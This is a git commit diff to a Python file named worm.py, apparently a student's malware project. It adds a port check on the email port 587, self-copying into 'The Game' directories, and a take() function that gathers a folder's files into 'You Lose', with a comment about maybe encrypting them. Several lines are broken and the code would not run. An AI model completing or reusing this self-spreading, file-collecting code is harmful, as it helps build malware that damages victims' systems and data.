ab4d841beb393cc7c7235dffdd0975567c5a2979
Mia Jenkins <mialanae@outlook.com>
2021-04-16 14:32:22 -0700

    finished take()?

--- worm.py
+++ worm.py
@@ -11,6 +11,38 @@ import socket #should allow me to pull the ip address of the host machine of the
 import platform #gives me system info
 from sys import argv #uses arguments 
 import subprocess #allows you to use terminal commands 
+import shutil #allows use to do file movement
+
+
+def portscan():
+    #random issue
+    #the following will scan to make sure the email port of the target is open allowing it to be sent through. if it is not open then it will not execute
+
+    #first I need a target this takes the host name using socket
+    target=socket.gethostname()
+
+
+    #with help from Geek for Geek
+    target_addy = socket.gethostbyname(target) #now we have the IP addess of the host machine
+
+    #try making it into a list because we only want certain ports 
+    #emailports = 
+
+    #open scanner
+    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    #scan for the one port you need which is 587 since this is being sent via email and will move via email; state will hold the port status
+    state = scanner.connect_ex(target_addy, 587)
+
+    #if the port is 0 then it is open run next line
+    if state == 0:
+        print('Open!') #these are just fillers until I fix the other code
+    else:
+        #if its not then die
+        print('oops') #these are just fillers until I fix the other code
+
+    #close the socket idk just sounds safe
+    scanner.close()
 
 def wiggle():
     #the purpose of this function is to allow the worm to move and find files
@@ -55,29 +87,54 @@ def copy():
         print ("yes")
 
     else:
-        #get the current location
+        #get the current location - do I Need the current location
         location = os.path.abspath(worm.py)
 
         #began the worm copy method
-        script = argv
+        script = arg
 
         #setting this to a name 
         name = str(script[0])
 
         #going to create the directory twice
         for i in range(0,1):
-            directoryName = 'The Game' + str(i)
+            directoryName = 'The Game'
             subprocess.call(['mkdir', directoryName])
             subprocess.call(['cp',name, directoryName])
 
-    
+def take():
+    #the take method will create a file and send all the other files in that folder
+
+    #get the current location
+    location = os.path.abspath(worm.py)
+
+    #create the folder there??
+    directory = 'You Lose'
+    subprocess.call(['mkdir', directory]) #this is my destination file
+
+    #copy all of the files in that directory
+
+    #i need to list all of the folder in a
+    files = os.listdir(location)
+
+    #then loop through all of those files
+    for filename in files:
+        #want to make the files a full pathway to properly copy
+        full_name = os.path.join(location, filename)
+        if os.isfile(full_name):
+
+            #send all of those copies to a new file 
+            shutil.copy(full_name, directory)
+
+    #maybe encrypt the file idk
 
 
 
 def main():
     wiggle()
-    copy()
-    take()
+    #do I need these here?
+    #copy()
+    #take()
 
 if __name__=="_main_":
     main()
